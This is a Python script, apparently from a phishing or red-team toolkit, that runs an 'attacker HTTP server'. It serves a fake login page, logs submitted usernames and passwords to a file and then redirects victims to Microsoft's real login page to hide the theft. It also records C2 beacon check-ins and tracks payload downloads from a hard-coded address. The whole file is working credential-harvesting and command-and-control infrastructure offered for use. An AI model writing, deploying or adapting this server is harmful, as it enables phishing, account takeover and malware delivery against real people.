#!/usr/bin/env python3
"""
Attacker HTTP server — serves payloads and captures form submissions.

Endpoints:
  GET  /          → fake login page (templates/fake_login.html)
  POST /capture   → logs submitted credentials, redirects to real site
  GET  /beacon    → C2 check-in logging
  GET  /payloads/ → tracked file downloads

Usage: python3 tools/http_server.py [port]
       Default port: 8080
"""

import http.server, socketserver, urllib.parse, json, datetime, os, sys

PORT  = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
ROOT  = os.path.join(os.path.dirname(__file__), "..", "payloads")
TMPL  = os.path.join(os.path.dirname(__file__), "..", "templates", "fake_login.html")
CREDS = "captured_credentials.log"


def ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=ROOT, **kw)

    def log_message(self, fmt, *args):
        print(f"  [{ts()}] {self.client_address[0]} {fmt % args}")

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path

        if path in ("/", "/login"):
            try:
                content = open(TMPL, "rb").read()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", len(content))
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Template not found")
            return

        if path.startswith("/beacon"):
            params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(self.path).query))
            print(f"\n  {'!'*50}")
            print(f"  [BEACON] {ts()} from {self.client_address[0]}")
            for k, v in params.items():
                print(f"    {k}: {v}")
            print(f"  {'!'*50}\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        if path.startswith("/payloads/"):
            print(f"\n  [DOWNLOAD] {ts()}: {path} by {self.client_address[0]}\n")

        super().do_GET()

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        n    = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode("utf-8", errors="replace")
        data = dict(urllib.parse.parse_qsl(body))

        if path == "/capture":
            entry = {"time": datetime.datetime.now().isoformat(),
                     "ip": self.client_address[0], **data}
            print(f"\n  {'!'*50}")
            print(f"  [CREDENTIALS] {ts()} from {self.client_address[0]}")
            for k, v in data.items():
                print(f"    {k}: {v}")
            print(f"  {'!'*50}\n")
            with open(CREDS, "a") as f:
                f.write(json.dumps(entry) + "\n")
            self.send_response(302)
            self.send_header("Location", "https://login.microsoftonline.com")
            self.end_headers()
            return

        self.send_response(200)
        self.end_headers()


def main():
    os.makedirs(ROOT, exist_ok=True)
    print("=" * 55)
    print(f"  Attacker HTTP Server  —  port {PORT}")
    print(f"  Payloads dir : {ROOT}")
    print(f"  Creds log    : {CREDS}")
    print(f"  Landing page : http://192.168.11.149:{PORT}/")
    print(f"  Beacon URL   : http://192.168.11.149:{PORT}/beacon")
    print(f"  Payloads     : http://192.168.11.149:{PORT}/payloads/<file>")
    print("  Ctrl+C to stop")
    print("=" * 55 + "\n")
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as s:
        s.allow_reuse_address = True
        try:
            s.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped.")

if __name__ == "__main__":
    main()
